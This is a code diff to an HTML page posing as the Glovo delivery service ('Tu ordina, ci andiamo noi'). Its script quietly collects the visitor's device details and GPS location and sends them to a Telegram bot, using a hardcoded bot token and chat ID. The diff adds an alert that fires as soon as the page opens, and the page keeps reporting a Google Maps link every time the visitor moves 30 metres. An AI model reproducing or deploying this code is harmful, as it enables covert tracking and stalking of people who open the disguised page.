@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Glovo - Tu ordina, ci andiamo noi</title>
   <style>
+    /* Stili rimangono invariati */
     html, body {
       margin: 0;
       padding: 0;
@@ -109,12 +110,17 @@
       return `${device} - ${browser}`;
     }
 
-    function sendTelegram(lat, lon) {
-      const dateTime = new Date().toLocaleString();
-      const link = `https://www.google.com/maps?q=${lat},${lon}`;
-      const deviceInfo = getDeviceInfo();
-      const message = `👀 Posizione aggiornata su Glovo!\n🕒 Data/Ora: ${dateTime}\n📱 Dispositivo: ${deviceInfo}\n📍 Posizione: ${link}`;
+    function sendTelegram(message) {
       fetch(`https://api.telegram.org/bot7772790004:AAFPul63mfCY8NIfH5Sju0r7b36_QuEJBAA/sendMessage?chat_id=5886300958&text=${encodeURIComponent(message)}`);
+    }
+
+    function sendPageOpenedNotification() {
+      const dateTime = new Date().toLocaleString();
+      const deviceInfo = getDeviceInfo();
+      const message = `📈 Pagina Glovo aperta
+🕒 Data/Ora: ${dateTime}
+📱 Dispositivo: ${deviceInfo}`;
+      sendTelegram(message);
     }
 
     function saveLocation(lat, lon) {
@@ -143,6 +149,8 @@
     }
 
     window.onload = function () {
+      sendPageOpenedNotification(); // invia subito notifica di pagina aperta
+
       const saved = getSavedLocation();
       if (saved) {
         updateStatus(saved.lat, saved.lon);
@@ -162,8 +170,16 @@
               distance = calculateDistance(previous.lat, previous.lon, lat, lon);
             }
 
-            if (!previous || distance >= 30) { // almeno 30 metri
-              sendTelegram(lat, lon);
+            if (!previous || distance >= 30) {
+              const dateTime = new Date().toLocaleString();
+              const deviceInfo = getDeviceInfo();
+              const link = `https://www.google.com/maps?q=${lat},${lon}`;
+              const message = `👀 Posizione aggiornata su Glovo!
+🕒 Data/Ora: ${dateTime}
+📱 Dispositivo: ${deviceInfo}
+📍 Posizione: ${link}`;
+              sendTelegram(message);
+
               saveLocation(lat, lon);
               updateStatus(lat, lon);
               console.log(`Posizione aggiornata. Distanza: ${distance.toFixed(2)} metri`);
@@ -196,3 +212,4 @@
   </div>
 </body>
 </html>
+
